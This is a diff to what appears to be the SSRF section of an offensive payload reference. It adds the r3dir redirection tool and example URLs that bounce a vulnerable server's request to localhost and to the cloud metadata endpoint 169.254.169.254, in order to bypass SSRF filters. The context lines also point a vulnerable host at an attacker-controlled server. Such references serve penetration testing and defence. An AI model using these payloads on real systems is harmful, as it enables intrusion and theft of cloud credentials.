@@ -63,8 +63,9 @@
 - [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus) - Generates gopher link for exploiting SSRF and gaining RCE in various servers
 - [In3tinct/See-SURF](https://github.com/In3tinct/See-SURF) - Python based scanner to find potential SSRF parameters
 - [teknogeek/SSRF Sheriff](https://github.com/teknogeek/ssrf-sheriff) - Simple SSRF-testing sheriff written in Go
-* [assetnote/surf](https://github.com/assetnote/surf) - Returns a list of viable SSRF candidates
-* [dwisiswant0/ipfuscator](https://github.com/dwisiswant0/ipfuscator) - A blazing-fast, thread-safe, straightforward and zero memory allocations tool to swiftly generate alternative IP(v4) address representations in Go.
+- [assetnote/surf](https://github.com/assetnote/surf) - Returns a list of viable SSRF candidates
+- [dwisiswant0/ipfuscator](https://github.com/dwisiswant0/ipfuscator) - A blazing-fast, thread-safe, straightforward and zero memory allocations tool to swiftly generate alternative IP(v4) address representations in Go.
+- [Horlad/r3dir](https://github.com/Horlad/r3dir) - a redirection service designed to help bypass SSRF filters that do not validate the redirect location. Intergrated with Burp with help of Hackvertor tags
 
 ## Payloads with localhost
 
@@ -261,6 +262,16 @@ http://127.1.1.1:80#\@127.2.2.2:80/
 2. Launch the SSRF pointing to  vulnerable.com/index.php?url=http://YOUR_SERVER_IP
 vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
 3. You can use response codes [307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307) and [308](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308) in order to retain HTTP method and body after the redirection.
+```
+
+To perform redirects without hosting own redirect server or perform seemless redirect target fuzzing, use https://github.com/Horlad/r3dir which hosted on r3dir.me
+
+```powershell
+#Redirects to http://localhost with `307 Temporary Redirect` status code
+https://307.r3dir.me/--to/?url=http://localhost
+
+#Redirects to http://169.254.169.254/latest/meta-data/ with `302 Found` status code
+https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me
 ```
 
 ### Bypassing using type=url
